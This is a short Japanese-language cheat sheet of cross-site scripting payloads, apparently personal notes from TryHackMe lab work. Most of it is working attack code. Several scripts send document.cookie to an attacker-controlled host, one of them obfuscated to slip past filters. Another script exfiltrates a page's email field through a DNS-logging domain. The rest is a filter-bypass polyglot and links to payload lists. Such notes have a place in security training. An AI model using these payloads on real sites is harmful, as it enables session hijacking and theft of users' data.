# XSS

## 例

### Cookie を送信

```js
<script>document.write('<img src="http://<attacker ip>:8888/' + document.cookie + '">')</script>
```

https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html?highlight=XSS#retrieve-cookies

```javascript
<script>fetch('http://<LHOST>:<PORT>?cookie=' + btoa(document.cookie) );</script>
```

```html
<IMG SRC=/ onerror="eval('fe'+'tch(`http://10.11.146.32:8000/${doc'+'ument.c'+'ookie}`)')"></img>
```

### 画面上の要素を送信

- textarea上に `<script>` が丸々表示される場合は、クローズタグを試す価値がある。
- リクエストが壊れないよう、特殊文字を置換している
- THMでは、http://10.10.10.100/ に Request Catcher がある。FWで自分のIPにリクエストさせられない場合。

```js
</textarea><script> 
var email = document.getElementById("email").innerText; 
email = email.replace("@", "8") 
email = email.replace(".", "0") 
document.location = "http://"+ email +".1f7d4a50dfb910819a8fba9df66e73ad.log.tryhackme.tech"</script>
```

### iframe

```js
<iframe src="javascript:alert(`xss`)">
```

## 参照

### ペイロードリスト

https://github.com/payloadbox/xss-payload-list
https://github.com/terjanq/Tiny-XSS-Payloads

### フィルター回避チートシート

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

### Polyglots

XSS の様々なフィルターをバイパスする文字列

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

### CSP

CSP.md も参照。
